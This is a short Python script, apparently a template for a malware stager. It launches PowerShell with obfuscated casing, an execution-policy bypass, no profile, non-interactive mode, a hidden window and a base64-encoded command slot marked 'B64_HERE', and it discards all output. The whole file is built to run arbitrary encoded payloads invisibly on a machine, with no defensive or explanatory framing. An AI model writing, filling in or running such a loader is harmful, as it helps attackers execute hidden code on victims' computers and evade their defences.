import subprocess as s

def main():
	b64 = "B64_HERE"
	cmd = ['pOwERsHeLl','-nop','-ep','bypass','-noexit','-NonI','-w','hidden','-e',b64]
	s.Popen(cmd,stdout=s.DEVNULL, stderr=s.DEVNULL)

if __name__ == "__main__":
	main()
